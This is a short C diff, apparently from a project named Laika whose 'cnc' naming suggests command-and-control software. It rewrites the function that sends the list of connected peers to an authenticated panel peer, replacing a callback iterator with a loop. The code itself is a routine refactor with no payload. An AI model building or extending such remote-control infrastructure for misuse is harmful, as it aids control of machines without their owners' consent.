@@ -5,22 +5,18 @@
 #include "lerror.h"
 #include "lmem.h"
 
-bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData)
-{
-    struct sLaika_peer *authPeer = (struct sLaika_peer *)uData;
-
-    /* make sure we're not sending connection information to themselves */
-    if (peer != authPeer) {
-        LAIKA_DEBUG("sending peer info %p to auth %p)\n", peer, authPeer);
-        laikaC_sendNewPeer(authPeer, peer);
-    }
-
-    return true;
-}
-
 void laikaC_sendPeerList(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
 {
-    laikaC_iterPeers(cnc, sendPanelPeerIter, (void *)authPeer);
+    struct sLaika_peer *peer;
+    size_t i = 0;
+
+    /* send authPeer details on each peer that *isn't* itself */
+    while (laikaC_iterPeersNext(cnc, &i, &peer)) {
+        if (peer != authPeer) {
+            LAIKA_DEBUG("sending peer info %p to auth %p)\n", peer, authPeer);
+            laikaC_sendNewPeer(authPeer, peer);
+        }
+    }
 }
 
 void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
